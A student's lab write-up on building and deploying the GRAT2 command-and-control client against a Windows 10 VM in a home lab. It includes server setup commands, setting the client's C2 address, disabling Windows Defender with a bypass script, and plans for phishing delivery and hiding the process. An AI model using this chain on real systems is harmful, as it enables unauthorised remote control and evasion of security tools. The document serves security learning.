## Exercise 1 - Command and Control

This is an exercise presented to me by a mentor which I've recreated to gain an intro in malware propagation and transmition.

---
### Environment
This exercise was performed by having both the attack and target machine within the same network.
#### Operating System
- Latest kali-VM rolling update (Red)
- Windows10 up to date (Red)
- Windows 10 up to date (Blue)

#### Tools
- GRAT2 - C&C (source: https://github.com/r3nhat/GRAT2)
- Bypass-Windows-Defender-VBS (Optional) (source: https://github.com/NYAN-x-CAT/Bypass-Windows-Defender-VBS/security)
- Visual Studio 2022 (Community)

---
### Methodology
#### Objectives/Flags
- Establish a C&C server on the Kali
- Build malware on the Win10(Red)
- Propagate executable to the target Win10(Blue).
#### Reconnaissance
N/A
#### Weaponization 
The first step was to setup up `Visual Studio (2022 Community edition)` on the Win10 (Red) where the client executable will be built. Once installed it was just a matter of installing the necessary addons that would allow projects to be built. This was a struggle as I haven’t had exposure to this IDE and program development. The best way I could describe it was just ensuring I installed the latest dot.Net SDK frameworks (This was mostly done through trial and error of trying to build the executable and working with the errors to find out what was missing)

Once I downloaded and unzipped out the GRAT2 package, I opened `GRAT2_client.sln`. This as I understand it is the project file where we will then open the sub files to configure. My next task was to set the project to point towards my GRAT2 server which will be hosted on the kali.

On the kali I grabbed the local IPv4 address.
```
ifconfig
  192.168.xxx.xxx
```

From there I needed to install the necessary before we get started.
```
pip3 install -r ~/GRAT2-C&C/GRAT2-master/requirements.txt
```

Now we can launch the server on port 80
```
cd ~/GRAT2-C&C/GRAT2-master/GRAT2_Server
  python3 grat2.py 80
```
The server was now up and running and listening for incoming connections.

Moving back to the Win10(Red) we opened Config.cs and modified the control-server address on line 9.
```
~\GRAT2-master\GRAT2_Client
  c2 = "http://192.168.xxx.xxx/"
```
Now the executable was ready to build however I encountered two errors during this process. Firstly, I was receiving an error related to the target dot.NET framework which was expecting an earlier version that what was currently installed. In order to remediate this error I needed to find what version I was using and retarget the project to use that later version.
The steps I used to find my version of the framework can be found here: `https://www.windowscentral.com/how-quickly-check-net-framework-version-windows-10`
Now that I found my version, I retargeted the version in the `GRAT2_Cient.csproj`
```
<TargetFrameworkVersion>vX.X</TargetFrameworkVersion>
```
Lastly before I could the project, I needed to disable Windows defender as it was picking up the executable's malicious code. I was pointed towards using the `Bypass-Windows-Defender-VBS` which I mentioned earlier to turn it all off. This however wasn't enough and when I built the project, I needed to specifically allow the executable past defender.
Once the executable was successfully built, I found it here: `~\GRAT2-master\GRAT2_Client\bin\Debug\GRAT2_Client.exe`

#### Delivery
I kept it simple for my first attempt at this exercise simply by copying over the executable from the Win10(Red) to the Win10(Blue), however in future I'd like to experiment different delivery techniques such as having it hosted on a HTTP server running on the kali where I then use phishing to have the target get and run the file on the target machine.

#### Exploitation
N/A
#### Installation 
N/A
#### Command & Control
Once the executable is run on the target machine a blank black console appears which creates a connection to the Grat2 server running on Kali. This can be seen on the Kali as a notice that `hostname` has connected. I imagine this console window can be manipulated to remain hidden and run in the background, possibly under disguised service processes.
#### Actions on Objective
From here we can begin to explore and manipulate the target machine with shell access.
From the Grat2 server:
```
listagents
  help
```
---
### After-action
#### What I've learned
This was the first exposure I've had to a command & control tool. It was a bit of a struggle to get Visual Studio working properly to build it out but once figured out it worked as intended. The code itself was a bit too complex for me to understand immediately but I took away the concept of how a server is run and how a target can be connected to it.
#### What I would've done differently
If I was to come back to this exercise I would like to expand upon the attack-chain to deliver the .exe from my attack machine to the target. Additionally, I would like to find ways to experiment with ways to hide the running executable from users and expand upon the actions on objectives to gain more control/visibility over the target's network. 

